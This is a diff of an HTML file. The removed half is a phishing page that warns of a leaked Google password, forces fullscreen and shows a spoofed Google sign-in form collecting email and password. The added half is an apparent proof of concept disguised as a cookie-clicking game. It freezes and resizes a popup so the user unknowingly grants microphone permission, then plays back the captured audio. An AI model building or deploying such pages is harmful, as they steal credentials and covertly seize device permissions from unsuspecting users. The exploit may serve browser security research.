@@ -1,94 +1,79 @@
+<!DOCTYPE html>
 <html>
-
 <head>
-    <style>
-        #front {
-            align-items: center;
-            justify-content: center;
-            padding: 25vh;
-            display: block;
-        }
-        
-        #spoofed {
-            display: none;
-        }
-        
-        .header {
-            position: absolute;
-            top: 0;
-            width: 100vw;
-        }
-        
-        #front>h1 {
-            text-align: center;
-            color: #333;
-            margin: 20px 0;
-        }
-        
-        #front>h3 {
-            text-align: center;
-            color: #12f030;
-            margin: 40px 0;
-        }
-        
-        #front>button {
-            display: block;
-            margin: 20px auto;
-            padding: 10px 20px;
-            background-color: #3f51b5;
-            color: #fff;
-            border: none;
-            border-radius: 5px;
-            cursor: pointer;
-        }
-    </style>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Cookie game!</title>
 </head>
+<body>
+  <h1>Wow!</h1>
+  <p>Click this cookie fast to win -> <b style="cursor:default" id="cookie">🍪</b></p>
+<script>
+// Attack params
+const waitBefore = 4;
+const waitPerResize = 6;
+const waitFreeze = 800;
+const clickable = document.getElementById("cookie");
 
-<body style="margin: 0;font-family: 'Ubuntu', Arial, sans-serif;overflow: hidden;">
-    <div id="front">
-        <h1>Oh no, your Account password has been leaked. To get your account back, follow these steps:
-            <h3>1. Notify Security Team by email about the case using the button below.
-                <br>2. On the next page of the Google Account website, enter your last used account password to verify.
-                <h3>
-        </h1>
-        <button onclick="run();">Send Email to Security Team</button>
-        <a href="mailto:notsecurity@notgoogle.com?subject=Request%20to%20Block%20Compromised%20Account&body=Dear%20Google%20Security%20Team%2C%0A%0AI%20hope%20this%20email%20finds%20you%20well.%20I%20am%20writing%20to%20notify%20you%20that%20my%20Google%20account%20password%20has%20been%20leaked.%20I%20am%20concerned%20about%20the%20security%20of%20my%20personal%20information%20and%20would%20like%20to%20request%20that%20my%20account%20be%20blocked%20as%20soon%20as%20possible.%0A%0APlease%20let%20me%20know%20what%20steps%20I%20need%20to%20take%20to%20ensure%20that%20my%20account%20is%20secured%20and%20my%20personal%20information%20is%20protected.%20I%20would%20also%20appreciate%20any%20additional%20security%20measures%20that%20you%20can%20recommend%20to%20prevent%20future%20incidents%20like%20this.%0A%0AThank%20you%20for%20your%20prompt%20attention%20to%20this%20matter.%20I%20look%20forward%20to%20hearing%20from%20you%20soon.."
-            id="runThis"></a>
-    </div>
-    <div id="spoofed">
-        <img src="top.png" class="header" />
-        <div style="display: flex; justify-content: center; align-items: center; height: 100vh;">
-            <div style="background-color: #fff; padding: 50px; box-shadow: 0px 0px 10px rgba(0,0,0,0.2); border-radius: 10px;">
-                <img src="https://www.gstatic.com/identity/boq/accountsettingsmobile/signedout_security_scene_316x112_897e5cfed5be1d1d2e6f376d675ff02d.png" style="display: block; margin: 0 auto;" />
+let targetTime = 0;
 
-                <form style="margin-top: 50px;">
-                    <h5 style="color: #12f030;">Enter your last used account password to verify.</h5>
-                    <div style="margin-bottom: 20px;">
-                        <label for="email" style="display: block; font-size: 14px;">Email:</label>
-                        <input type="text" id="username" name="username" style="width: 100%; padding: 10px; font-size: 16px; border-radius: 5px; border: 1px solid #ccc;">
-                    </div>
-                    <div style="margin-bottom: 20px;">
-                        <label for="password" style="display: block; font-size: 14px;">Password:</label>
-                        <input type="password" id="password" name="password" style="width: 100%; padding: 10px; font-size: 16px; border-radius: 5px; border: 1px solid #ccc;">
-                    </div>
-                    <input type="submit" value="Sign In" style="width: 100%; padding: 10px; background-color: #3f51b5; color: #fff; border: none; border-radius: 5px; font-size: 16px; cursor: pointer;">
-                </form>
-            </div>
-        </div>
+function openTarget(){
+  window.open("poc01.html", "target", "popup");
+}
 
-    </div>
-    <script>
-        function run() {
-            const firstDiv = document.getElementById("front");
-            const secondDiv = document.getElementById("spoofed");
-            document.documentElement.requestFullscreen();
-            const butt = document.getElementById("runThis");
-            runThis.click();
-            firstDiv.style.display = "none";
-            secondDiv.style.display = "block";
+if (window.name !== "target") {
+  /* Main window */
+  document.body.innerHTML = `
+    <h1>Play our cool new cookie clicking game!</h1>
+    <button onClick="openTarget()">Click to play!</button>
+  `;
+} else if (!document.cookie.includes("success=true")) {
+  /* Game window */
+  window.resizeTo(286,256);
+  window.moveBy(-12, -12);
+} else {
+  /* Success window */
+  targetTime = 1;
+  document.cookie = "success=";
+  navigator.mediaDevices.getUserMedia({"audio": true}).then((stream)=>{
+    const audioContext = new AudioContext();
+    const microphone = audioContext.createMediaStreamSource(stream);
+    const destination = audioContext.destination;
+    microphone.connect(destination);
+    document.body.appendChild(document.createTextNode("Playing back microphone audio..."));
+  });
+}
 
-        }
-    </script>
+function currentTimeMillis(){
+  return parseFloat(new Date().getTime())
+}
+
+
+function waitFor(){
+  setTimeout(()=>{
+    if (targetTime < currentTimeMillis()) return;
+    waitFor()
+    window.resizeBy(10, 10)
+    window.resizeBy(-10, -10)
+  }, waitPerResize);
+}
+
+clickable.addEventListener("click", (e) => {
+  // Only activate once
+  if (targetTime !== 0) return;
+
+  // Wait 8ms and freeze UI for ~1 second
+  targetTime = currentTimeMillis() + waitFreeze;
+  setTimeout(()=>waitFor(), waitBefore)
+
+  // Ask for microphone
+  navigator.mediaDevices.getUserMedia({"audio": true}).then((stream)=>{
+    // If microphone received, reopen the page to hide permission dialog
+    targetTime = 2;
+    document.cookie = "success=true";
+    openTarget();
+  });
+});
+</script>
 </body>
-
 </html>
